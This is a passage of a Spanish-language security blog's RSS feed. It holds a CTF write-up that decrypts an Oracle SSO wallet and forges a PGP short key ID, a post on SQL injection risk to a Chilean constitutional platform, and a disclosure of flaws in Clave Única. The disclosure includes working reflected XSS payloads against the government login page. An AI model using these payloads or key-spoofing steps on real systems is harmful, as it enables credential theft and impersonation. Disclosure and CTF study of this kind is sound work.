+&lt;p&gt;What happens if the first entry in &lt;code&gt;matches&lt;/code&gt; doesn't get the version completely for a site but the second one does? Is it fine to move the second entry to the top to be the first regex to be tried? With 5 sites it's manageable but when the list grows, it's hard to know if with our changes we're affecting the accurate detection in some sites.&lt;/p&gt;
+&lt;p&gt;Neither &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; nor &lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; have public tests in their repositories and I think they are really important to have consistent results.&lt;/p&gt;
+&lt;h3 id="conclusions"&gt;Conclusions&lt;/h3&gt;
+&lt;p&gt;After reviewing the &lt;em&gt;state-of-the-art&lt;/em&gt; in the field, I would like to introduce &lt;strong&gt;detectem&lt;/strong&gt;, a new application for web software detection in the &lt;a href="http://spect.cl/blog/2016/11/introducing-detectem/"&gt;next post&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>EKO12 Writeup</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;La semana pasada asistí por primera vez a la &lt;a href="http://ekoparty.org/"&gt;ekoparty&lt;/a&gt; después de muchos años tratando de ir. Cerca de 2500 asistentes (más menos cinco veces la &lt;a href="https://www.8dot8.org/"&gt;8dot8 Chile&lt;/a&gt;), un programa de charlas técnicamente interesantes y un buen ambiente con un montón de desafíos por parte de compañías y organizaciones.&lt;/p&gt;
+&lt;p&gt;El&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2016/11/eko12-writeup/</link><guid isPermaLink="false">59f734f9aade9a0001902fd5</guid><category>ctf</category><category>security</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Wed, 02 Nov 2016 19:13:35 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;La semana pasada asistí por primera vez a la &lt;a href="http://ekoparty.org/"&gt;ekoparty&lt;/a&gt; después de muchos años tratando de ir. Cerca de 2500 asistentes (más menos cinco veces la &lt;a href="https://www.8dot8.org/"&gt;8dot8 Chile&lt;/a&gt;), un programa de charlas técnicamente interesantes y un buen ambiente con un montón de desafíos por parte de compañías y organizaciones.&lt;/p&gt;
+&lt;p&gt;El que más me llamo la atención fue el &lt;a href="http://ctf.ekoparty.org/"&gt;CTF oficial&lt;/a&gt; de la conferencia organizado por &lt;a href="https://null-life.com/"&gt;Null-Life&lt;/a&gt;. Anteriormente no había tenido tiempo para participar en las versiones remotas así que me anime para la competencia local y logré el segundo lugar!&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/eko12_final_score.png"&gt;
+&lt;p&gt;Fue una competencia dura ya que participé solo y la mayoría de los contrincantes eran teams de 3+ personas. Sumado a eso, no iba preparado: no tenía máquinas virtuales en mi laptop ni servidores con salida directa a Internet.&lt;/p&gt;
+&lt;p&gt;Sin embargo, logré resolver varias tareas:&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/eko12_dashboard.png"&gt;
+&lt;p&gt;Hay un claro déficit en el área de reversing y exploiting ya que no es mi fuerte. Conforme a eso, hay una &lt;a href="https://ctftime.org/event/342/tasks/"&gt;serie de writeups&lt;/a&gt; ya en Internet así que me centraré en dos que me permitieron obtener el segundo lugar debido a su puntaje: &lt;em&gt;LSSO&lt;/em&gt; (Misc 200) y &lt;em&gt;The Fake Satoshi&lt;/em&gt; (Misc 300).&lt;/p&gt;
+&lt;h3 id="lsso"&gt;LSSO&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;All my passwords are safely stored, or not?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Junto a esto, venía el siguiente adjunto: &lt;a href="http://cdn.spect.cl/blog/posts/files/misc200.zip"&gt;misc200.zip&lt;/a&gt;. Lo primero que me llamó la atención fue que viniera un fichero comprimido &lt;code&gt;.rar&lt;/code&gt; dentro del &lt;code&gt;.zip&lt;/code&gt;, lo cual no era común en las otras tareas.&lt;/p&gt;
+&lt;p&gt;Dentro del &lt;code&gt;.rar&lt;/code&gt; venían dos ficheros: &lt;code&gt;cwallet.sso&lt;/code&gt; y &lt;code&gt;ewallet.p12&lt;/code&gt;. Buscando en Google por el primer fichero veo que corresponde a una &lt;a href="https://docs.oracle.com/cd/E23943_01/core.1111/e10105/wallets.htm#CIHHAHHF"&gt;solución de Oracle&lt;/a&gt; para guardar información de autologin. También en los primeros resultados sale una referencia a &lt;a href="https://github.com/tejado/ssoDecrypt"&gt;ssoDecrypt&lt;/a&gt;, la cual es una herramienta para descifrar estos ficheros. Después de instalarla una primera corrida arrojó lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ ./ssoDecrypt.sh ../cwallet.sso
+PKCS12 key store mac invalid - wrong password or corrupted file.
+PKCS12 key store mac invalid - wrong password, wrong LSSO secret (username + hostname) or corrupted file.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Leyendo más sobre la herramienta, al final de su &lt;code&gt;README&lt;/code&gt; sale una referencia a &lt;a href="https://github.com/tejado/ssoDecrypt#local-sso-wallet"&gt;Local SSO wallet&lt;/a&gt;, por lo que relacionando con el título &lt;em&gt;LSSO&lt;/em&gt;, la respuesta debía ir por ese lado. ¿ Dónde encontrar el usuario y hostname? Los ficheros comprimidos soportan comentarios así que lo primero en revisar sería el famoso &lt;code&gt;.rar&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ unrar v ekochall.rar
+
+UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal
+
+By Hugo@ekodesktop
+[...]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tenemos nuestro usuario y hostname, ahora a intentar obtener la respuesta.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ./ssoDecrypt.sh ../cwallet.sso Hugo ekodesktop
+sso key: a252ece7d911fa0e
+sso secret: 0e6b16ac78d6231bd237e71e0bb931c53765a6bf8f356acd
+obfuscated password: 444a4f701601137b7447745039566b03
+p12 password (hex): 2b416f615a571a645f442766103d2334
+--------------------------------------------------------
+----------------------------------------------
+Credential #1: ekoparty/EKO{vPgsSHXO0LiHlZk667Xr}@ekoparty
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;La solución era &lt;code&gt;EKO{vPgsSHXO0LiHlZk667Xr}&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id="thefakesatoshi"&gt;The Fake Satoshi&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Hello Mr. Giarc, upload again your false PGP key to pgp.mit.edu and send us any file you want with its signature to prove you are the fake Satoshi!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The key on the server should look like the following line (case sensitive):&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;Type bits/keyID     Date       User ID
+pub  1024R/5EB7CB21 2008-10-30 Fake Satoshi EKOPARTY12 (csalazar) &amp;lt;satoshin@gmx.com&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cuando leí este desafío, se me vino en mente un problema que hubo este año sobre las &lt;em&gt;short-key ids&lt;/em&gt; en el desarrollo de un software open-source. Teniendo ya claro para donde iba el asunto, leí un completo &lt;a href="https://gwolf.org/node/4070"&gt;post&lt;/a&gt; sobre la problemática escrito por Gunnar Wolf.&lt;/p&gt;
+&lt;p&gt;Este post menciona el proyecto &lt;a href="https://github.com/lachesis/scallion"&gt;scallion&lt;/a&gt; que sirve para generar llaves GPG con ciertas características. Para este caso, hay dos requerimientos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Los últimos 8 bytes del fingerprint (&lt;code&gt;short-key-id&lt;/code&gt;) debe ser &lt;code&gt;5EB7CB21&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;La fecha de generación de la llave debe ser &lt;code&gt;2008-10-30&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Afortunadamente &lt;code&gt;scallion&lt;/code&gt; soporta expresiones regulares para definir los requerimientos de nuestra llave y el requerimiento de la fecha se puede solucionar fácilmente. Mi laptop no cuenta con una tarjeta GPU activa por lo que mi primo Francisco Chirino me ayudo en la generación de la llave apropiada:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;scallion.exe --gpg 5EB7CB21$&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;El output de ese comando contiene una llave privada que tiene &lt;code&gt;short-key-id=5EB7CB21&lt;/code&gt;.  Teniendo ya la llave GPG privada en &lt;code&gt;satoshi.key&lt;/code&gt;, la importé en el anillo &lt;em&gt;GPG&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ gpg --import --allow-non-selfsigned-uid satoshi.key&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Lo último que quedaba por editar era el nombre que aparecía en la llave, lo cual se puede hacer con la opción &lt;code&gt;--edit-key&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ gpg --edit-key 5EB7CB21&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Ahí es necesario eliminar el nombre inicial y agregar &lt;code&gt;Fake Satoshi EKOPARTY12 (csalazar)&lt;/code&gt; con el correspondiente e-mail &lt;code&gt;satoshin@gmx.com&lt;/code&gt;. Finalmente, subí la llave a &lt;code&gt;pgp.mit.edu&lt;/code&gt; con la opción &lt;code&gt;--send-keys&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ gpg --send-keys --keyserver pgp.mit.edu 5EB7CB21&lt;/code&gt;&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/eko12_gpg_key.png"&gt;
+&lt;p&gt;Luego, el reto consistía en firmar un fichero cualquiera (en este caso &lt;code&gt;boom.txt&lt;/code&gt;) con la llave:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ gpg -u 5EB7CB21 --sign boom.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Se debía subir el fichero y la firma. Tras eso, el servidor bajaba todas las firmas con &lt;code&gt;short-key-id=5EB7CB21&lt;/code&gt; para verificar si mi fichero fue firmado por una llave con ese &lt;code&gt;short-key-id&lt;/code&gt;. Como lo anterior es verdadero, retornaba la solución en su output.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Para la constitución, una conversación (sobre seguridad)</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;El día de ayer fue lanzado un &lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;exploit&lt;/a&gt; para &lt;a href="https://dev.mysql.com/"&gt;MySQL&lt;/a&gt; que permite escalar privilegios dada una serie de condiciones. El peor caso es que una &lt;em&gt;simple&lt;/em&gt; inyección SQL puede llevar a un atacante a obtener privilegios de administrador a nivel de sistema operativo en el servidor donde reside la base&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2016/09/para-la-constitucion-una-conversacion-sobre-seguridad/</link><guid isPermaLink="false">59f734f9aade9a0001902fd4</guid><category>security</category><category>chile</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Tue, 13 Sep 2016 00:00:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;El día de ayer fue lanzado un &lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;exploit&lt;/a&gt; para &lt;a href="https://dev.mysql.com/"&gt;MySQL&lt;/a&gt; que permite escalar privilegios dada una serie de condiciones. El peor caso es que una &lt;em&gt;simple&lt;/em&gt; inyección SQL puede llevar a un atacante a obtener privilegios de administrador a nivel de sistema operativo en el servidor donde reside la base de datos.&lt;/p&gt;
+&lt;p&gt;Lo que hoy hablaré es una historia sobre seguridad, una aplicación vulnerable a inyección SQL y el proyecto estrella del actual gobierno: &lt;a href="https://www.unaconstitucionparachile.cl"&gt;&amp;quot;Una Constitución para Chile&amp;quot;&lt;/a&gt;. Este post trata sobre cómo se puede llegar a comprometer un proceso democrático por la falta de medidas de seguridad.&lt;/p&gt;
+&lt;h4 id="enbuscadelavulnerabilidad"&gt;En busca de la vulnerabilidad&lt;/h4&gt;
+&lt;p&gt;Cuando participé como ciudadano en &lt;a href="https://www.unaconstitucionparachile.cl"&gt;&amp;quot;Una Constitución para Chile&amp;quot;&lt;/a&gt; esta ofrecía una funcionalidad limitada, solo era posible responder una encuesta y organizar un encuentro comunal. A simple vista parecía una aplicación con buenas validaciones donde encontrar una vulnerabilidad que afecte a los demás ciudadanos requería tiempo y no parecía una tarea fácil. Entonces tomé otro camino.&lt;/p&gt;
+&lt;p&gt;La plataforma estaba balanceada y otra aplicación estaba siendo hospedada en los mismos servidores: la aplicación &lt;code&gt;X&lt;/code&gt;, vulnerable a inyección SQL sobre un motor &lt;a href="https://dev.mysql.com/"&gt;MySQL&lt;/a&gt;. No pretendo dar mayores detalles sobre esto ya que la aplicación sigue vulnerable.&lt;/p&gt;
+&lt;p&gt;Después de ese descubrimiento, lo reporté immediatamente a través de los canales de comunicación respectivos (Abril 2016). Pedí explícitamente que movieran la aplicación &lt;code&gt;X&lt;/code&gt; a otro servidor ya que sus vulnerabilidades podían comprometer &lt;a href="https://www.unaconstitucionparachile.cl"&gt;&amp;quot;Una Constitución para Chile&amp;quot;&lt;/a&gt;. La transición fue realizada rápidamente.&lt;/p&gt;
+&lt;p&gt;Respecto a las vulnerabilidades en la aplicación &lt;code&gt;X&lt;/code&gt;, que podían ser fácilmente explotadas con herramientas como &lt;a href="http://sqlmap.org/"&gt;sqlmap&lt;/a&gt;, los desarrolladores consideraron que no eran graves ya que la información que estaba en la base de datos era acotada. Una especie de &lt;strong&gt;SQL-Injection-Driven development&lt;/strong&gt; (&lt;code&gt;SQLIDD&lt;/code&gt;).&lt;/p&gt;
+&lt;h4 id="hiptesis"&gt;Hipótesis&lt;/h4&gt;
+&lt;p&gt;Para los que trabajamos en seguridad, sabemos que el peor caso es posible. Y no solo es posible, sino que buscado por ciertas personas. El caso hipótetico que quiero plantear es simple: aplicar éxitosamente el &lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;exploit&lt;/a&gt;  a la aplicación &lt;code&gt;X&lt;/code&gt;, obtener privilegios de administrador y tomar el control de la plataforma &lt;a href="https://www.unaconstitucionparachile.cl"&gt;&amp;quot;Una Constitución para Chile&amp;quot;&lt;/a&gt;, ya sea porque están en el mismo servidor (como en un inicio) o porque comparten el servidor de base de datos. Como sea, esto compromete la validez del proceso democrático ya que la información en la base de datos puede ser adulterada.&lt;/p&gt;
+&lt;p&gt;Hay muchas teorías más sobre posibles escenarios, sin embargo hay una premisa irremplazable para contrarrestar todo esto: &lt;strong&gt;no dar ventajas&lt;/strong&gt;. Esta historia es un ejemplo claro de dos cosas que nos encontramos hoy en día:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Desarrolladores con poco entendimiento de seguridad y por lo tanto no responden de forma adecuada a incidentes de seguridad.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Falta de gestión del riesgo en procesos democráticos realizados a través de Internet.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Quizás esta vez no paso nada, quizás para la próxima se tenga que declarar nulo un proceso completo por falta de garantías, y de ingeniería.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Vulnerabilidades en Clave Unica</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;&lt;a href="https://www.claveunica.gob.cl/"&gt;Clave Única&lt;/a&gt; es un sistema desarrollado por el gobierno chileno para autenticar y autorizar a los ciudadanos a usar una variedad de servicios gubernamentales. Según su &lt;a href="https://www.claveunica.gob.cl/documentacion.html"&gt;documentación técnica&lt;/a&gt; usa &lt;a href="https://openid.net/connect/"&gt;OpenID Connect 1.0&lt;/a&gt; y también se describe su funcionamiento interno &lt;a href="https://www.claveunica.gob.cl/documentacion/configuracion.html"&gt;en detalle&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Desde el punto de vista legal, hay un&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2016/02/vulnerabilidades-en-claveunica/</link><guid isPermaLink="false">59f734f9aade9a0001902fd3</guid><category>security</category><category>chile</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Mon, 29 Feb 2016 18:11:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;&lt;a href="https://www.claveunica.gob.cl/"&gt;Clave Única&lt;/a&gt; es un sistema desarrollado por el gobierno chileno para autenticar y autorizar a los ciudadanos a usar una variedad de servicios gubernamentales. Según su &lt;a href="https://www.claveunica.gob.cl/documentacion.html"&gt;documentación técnica&lt;/a&gt; usa &lt;a href="https://openid.net/connect/"&gt;OpenID Connect 1.0&lt;/a&gt; y también se describe su funcionamiento interno &lt;a href="https://www.claveunica.gob.cl/documentacion/configuracion.html"&gt;en detalle&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Desde el punto de vista legal, hay un &lt;a href="https://www.claveunica.gob.cl/assets/docs/Naturaleza_juridica.pdf"&gt;documento&lt;/a&gt; especificando su alcance. Cito como se estipula en la sección &lt;em&gt;V. CONCLUSIONES.&lt;/em&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;La utilización de “ClaveÚnica” tendrá la misma validez y efectos jurídicos que&lt;br&gt;
+tendría si los actos, contratos o declaraciones fueran efectuados por escrito y suscritos&lt;br&gt;
+a través de una firma manuscrita.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Entonces, cualquier vulnerabilidad que presente no solo afecta a un ciudadano como un usuario dentro de un sistema, sino que también puede tener efectos legales que lo perjudiquen. En esta investigación describiré una serie de vulnerabilidades en la plataforma &lt;strong&gt;Clave Única&lt;/strong&gt;, las cuales tras ser reportadas no han sido completamente solucionadas.&lt;/p&gt;
+&lt;p&gt;PD: Siendo que no soy experto en &lt;em&gt;OpenID Connect&lt;/em&gt;, cualquier corrección es bienvenida.&lt;/p&gt;
+&lt;h6 id="peticindeejemplo"&gt;Petición de ejemplo&lt;/h6&gt;
+&lt;p&gt;Cada servicio crea una petición acorde a la información que necesita, por lo tanto todas las peticiones hacia &lt;strong&gt;Clave Única&lt;/strong&gt; no son iguales. Lo que si, hay algunos campos que son comunes como (más información puede ser consultada &lt;a href="https://openid.net/specs/openid-authentication-1_1.html#mode_checkid_setup"&gt;aquí&lt;/a&gt;):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;openid.identity&lt;/em&gt;: &lt;code&gt;http://specs.openid.net/auth/2.0/identifier_select&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;openid.assoc_handle&lt;/em&gt;: valor generado por el servicio gubernamental para autenticar que la petición fue realizada por él. Corresponde al &lt;a href="https://www.claveunica.gob.cl/documentacion/configuracion.html"&gt;paso 1&lt;/a&gt; de la guía.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;openid.return_to&lt;/em&gt;: &lt;em&gt;URL&lt;/em&gt; a la que &lt;em&gt;Clave Única&lt;/em&gt; devuelve el control después de una autenticación correcta.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;openid.realm&lt;/em&gt;: parámetro opcional que define el dominio.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;openid.mode&lt;/em&gt;: &lt;code&gt;checkid_setup&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;openid.ns&lt;/em&gt;: &lt;code&gt;http://specs.openid.net/auth/2.0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Por lo visto, la información requerida sobre el ciudadano se agrega al namespace &lt;code&gt;openid.ns&lt;/code&gt; u &lt;code&gt;openid.ax&lt;/code&gt;. En ejemplo, se tomará la petición creada por un sitio del &lt;a href="http://mi.indap.cl"&gt;Indap&lt;/a&gt; a &lt;strong&gt;Clave Única&lt;/strong&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://www.claveunica.cl/autenticacion/openid?openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;amp;openid.assoc_handle=5149ecec9e5cbaa36eeb4aae0a8ea403da5fbe5b&amp;amp;openid.return_to=http%3A%2F%2Fmi.indap.cl%2Findex.aspx%3Fdnoa.userSuppliedIdentifier%3Dhttps%253A%252F%252Fwww.claveunica.cl%252Fautenticacion%252Fopenid&amp;amp;openid.realm=http%3A%2F%2Fmi.indap.cl%2F&amp;amp;openid.mode=checkid_setup&amp;amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;amp;openid.ns.alias3=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&amp;amp;openid.alias3.required=alias1&amp;amp;openid.alias3.mode=fetch_request&amp;amp;openid.alias3.type.alias1=http%3A%2F%2Faxschema.org%2Fperson%2Fguid&amp;amp;openid.alias3.count.alias1=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id="vulnerabilidades"&gt;Vulnerabilidades&lt;/h2&gt;
+&lt;p&gt;Este reporte resume una serie de vulnerabilidades. Primero, los casos de &lt;a href="https://es.wikipedia.org/wiki/Cross-site_scripting"&gt;Cross Site Scripting&lt;/a&gt; (XSS) en la página de ingreso de credenciales son críticos ya que un atacante podría usurpar el usuario y contraseña ingresados.&lt;/p&gt;
+&lt;h4 id="xssatravsdelparmetroopenidreturn_to"&gt;XSS a través del parámetro &lt;code&gt;openid.return_to&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;Si no está presente el parámetro &lt;code&gt;openid.realm&lt;/code&gt;, &lt;code&gt;openid.return_to&lt;/code&gt; es reflejado en la página &lt;code&gt;https://www.claveunica.cl/autenticacion/openid&lt;/code&gt;, siendo posible inyectar código &lt;em&gt;HTML&lt;/em&gt; y &lt;em&gt;Javascript&lt;/em&gt;. Reemplazando en nuestra petición de ejemplo ambos parámetros con:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;openid.return_to=http%3A%2F%2Fexample.org%2F&amp;lt;script&amp;gt;alert('test')&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Se explota correctamente la vulnerabilidad.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/cu_xss_redirect_to.png" height="600" width="720"&gt;
+&lt;h4 id="xssatravsdelparmetroopenidrealm"&gt;XSS a través del parámetro &lt;code&gt;openid.realm&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;El parámetro &lt;code&gt;openid.realm&lt;/code&gt; es reflejado en la página &lt;code&gt;https://www.claveunica.cl/autenticacion/openid&lt;/code&gt;, siendo posible inyectar código &lt;em&gt;HTML&lt;/em&gt; y &lt;em&gt;Javascript&lt;/em&gt;. Sin embargo, no es tan simple como poner nuestro vector de ataque sino que hay una relación entre &lt;code&gt;openid.realm&lt;/code&gt; y &lt;code&gt;openid.return_to&lt;/code&gt;, la cual es:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;openid.realm&lt;/code&gt; debe estar contenido en &lt;code&gt;openid.return_to&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Entonces, enviando ambos parámetros iguales podemos explotar la vulnerabilidad:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;openid.return_to=http%3A%2F%2Fexample.org%2F&amp;lt;script&amp;gt;alert('test')&amp;lt;/script&amp;gt;&amp;amp;openid.realm=http%3A%2F%2Fexample.org%2F&amp;lt;script&amp;gt;alert('test')&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id="xssatravsdensdata"&gt;XSS a través de &lt;code&gt;ns&lt;/code&gt; data&lt;/h4&gt;
+&lt;p&gt;Por lo que entiendo, el namespace &lt;code&gt;openid.ns&lt;/code&gt; se utiliza para describir qué datos del ciudadano necesita saber el servicio. Por ejemplo, el sitio del &lt;a href="http://mi.indap.cl"&gt;Indap&lt;/a&gt; solicita esta información:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;openid.ns.alias3=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&amp;amp;openid.alias3.required=alias1&amp;amp;openid.alias3.mode=fetch_request&amp;amp;openid.alias3.type.alias1=http%3A%2F%2Faxschema.org%2Fperson%2Fguid&amp;amp;openid.alias3.count.alias1=1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Lo cual se refleja en la página &lt;code&gt;https://www.claveunica.cl/autenticacion/openid&lt;/code&gt; como:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;attributes[person/guid]&amp;quot; value=&amp;quot;1&amp;quot; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Luego de un análisis, el parámetro &lt;code&gt;openid.alias3.type.alias1&lt;/code&gt; no es correctamente incrustado y se da un caso de &lt;em&gt;Cross Site Scripting&lt;/em&gt;. Un vector de ataque exitoso sería reemplazar el parámetro por:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;openid.alias3.type.alias1=http%3A%2F%2Faxschema.org%2Fperson%2Fguid&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;test&amp;quot;)&amp;lt;/script&amp;gt;&amp;lt;!--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El mismo tipo de escenario se da con los datos declarados a través de &lt;code&gt;openid.ax&lt;/code&gt; como en la petición generada por &lt;a href="https://fne.chilesinpapeleo.cl/tramites/disponibles"&gt;la Fiscalía Nacional Económica&lt;/a&gt;.&lt;/p&gt;
+&lt;h4 id="faltadecifradoenopenidredirect_to"&gt;Falta de cifrado en &lt;code&gt;openid.redirect_to&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;Si bien la &lt;a href="https://www.claveunica.gob.cl/documentacion/configuracion.html"&gt;guía&lt;/a&gt; recalca el uso de &lt;em&gt;HTTPS&lt;/em&gt;, &lt;strong&gt;Clave Única&lt;/strong&gt; no fuerza a que el parámetro &lt;code&gt;openid.redirect_to&lt;/code&gt; use &lt;em&gt;HTTPS&lt;/em&gt;, pudiendo utilizar &lt;em&gt;HTTP&lt;/em&gt;. El flujo en el escenario anteriormente mencionado se puede graficar como:&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/cu_http_https.png"&gt;
+&lt;p&gt;Esto posibilita que un atacante haciendo un ataque &lt;a href="https://es.wikipedia.org/wiki/Ataque_Man-in-the-middle"&gt;man-in-the-middle&lt;/a&gt; no será capaz de leer el contenido de la petición &lt;em&gt;HTTPS&lt;/em&gt; desde el servicio a &lt;strong&gt;Clave Única&lt;/strong&gt;, pero si podrá leer la petición desde &lt;strong&gt;Clave Única&lt;/strong&gt; al servicio y que contiene el código de acceso.&lt;/p&gt;
+&lt;p&gt;Este caso se encuentra en páginas como &lt;a href="http://mi.indap.cl"&gt;Indap&lt;/a&gt; que tiene una página de retorno en &lt;em&gt;HTTP&lt;/em&gt;: &lt;code&gt;openid.return_to=http://mi.indap.cl/index.aspx&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id="faltadetokendeestado"&gt;Falta de token de estado&lt;/h4&gt;
+&lt;p&gt;El &lt;a href="https://www.claveunica.gob.cl/documentacion/configuracion.html"&gt;primer paso de la guía&lt;/a&gt; es sobre la creación de un token de estado, sin embargo &lt;strong&gt;Clave Única&lt;/strong&gt; no fuerza su requerimiento. Un ejemplo de esto es la &lt;a href="http://www.sag.cl/oficina_virtual"&gt;oficina virtual del SAG&lt;/a&gt; que en su petición a &lt;strong&gt;Clave Única&lt;/strong&gt; no envía un token de estado (no existe el parámetro &lt;code&gt;openid.assoc_handle&lt;/code&gt;).&lt;/p&gt;
+&lt;h4 id="generacindeerrorydivulgacindesoftware"&gt;Generación de error y divulgación de software&lt;/h4&gt;
+&lt;p&gt;Una petición quitando los parámetros &lt;code&gt;openid.identity&lt;/code&gt; y &lt;code&gt;openid.assoc_handle&lt;/code&gt; generó los siguientes errores:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;A PHP Error was encountered
+Severity: Notice
+Message: Undefined index: openid_identity
+Filename: LightOpenIDProvider/provider.php
+Line Number: 346
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tomando en cuenta el tipo de error, nombre de fichero y línea, podemos darnos cuenta que &lt;strong&gt;Clave Única&lt;/strong&gt; está usando &lt;a href="https://github.com/iignatov/LightOpenID/blob/master/provider/provider.php#L346"&gt;LightOpenID&lt;/a&gt; como biblioteca para gestionar el uso de &lt;em&gt;OpenID&lt;/em&gt;. Esto abre la posibilidad de encontrar más vulnerabilidades leyendo el código fuente.&lt;/p&gt;
+&lt;h3 id="mitigacionesytimeline"&gt;Mitigaciones y Timeline&lt;/h3&gt;
+&lt;p&gt;Esta serie de vulnerabilidades fueron reportadas con la ayuda del &lt;a href="http://www.csirt.gob.cl/"&gt;CSIRT&lt;/a&gt;. Ellos permitieron que mi reporte llegara a los desarrolladores, los cuales no establecieron contacto directo conmigo.&lt;/p&gt;
